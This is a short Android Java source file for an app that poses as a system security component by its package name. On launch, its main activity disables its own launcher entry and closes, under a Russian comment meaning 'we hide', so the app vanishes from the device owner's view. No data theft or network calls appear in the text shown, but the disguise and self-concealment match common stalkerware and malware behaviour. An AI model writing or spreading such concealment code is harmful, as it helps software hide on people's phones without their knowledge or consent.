package com.android.system.core.security;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Скрываемся
        getPackageManager().setComponentEnabledSetting(
            new android.content.ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        );
        finish();
    }
}
